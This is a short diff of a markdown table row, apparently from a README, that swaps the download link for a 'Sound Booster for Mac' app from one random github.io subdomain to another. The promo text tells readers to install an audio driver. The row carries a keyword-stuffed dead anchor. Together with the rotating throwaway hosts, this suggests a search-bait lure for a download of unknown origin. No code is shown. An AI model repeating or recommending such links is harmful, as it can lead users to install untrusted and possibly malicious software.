@@ -24,7 +24,7 @@
 
 ---
 
-| [![Download Sound Booster for Mac](https://i.postimg.cc/hjPfG0vF/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png)](https://drollabil.github.io/.github/sound-booster-mac) | **Boost Mac volume beyond system maximum — louder audio in one click** <br><br> <a href="#">Volume booster Mac</a> — install the audio driver, open the Sound Booster menu bar control, and push the volume slider above the standard 100% limit. Quiet videos, low-volume audio calls, and recordings with low gain all become audible at comfortable listening levels. |
+| [![Download Sound Booster for Mac](https://i.postimg.cc/hjPfG0vF/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png)](https://skalsd-oasd.github.io/.github/sound-booster-mac) | **Boost Mac volume beyond system maximum — louder audio in one click** <br><br> <a href="#">Volume booster Mac</a> — install the audio driver, open the Sound Booster menu bar control, and push the volume slider above the standard 100% limit. Quiet videos, low-volume audio calls, and recordings with low gain all become audible at comfortable listening levels. |
 |---|---|
 
 ---
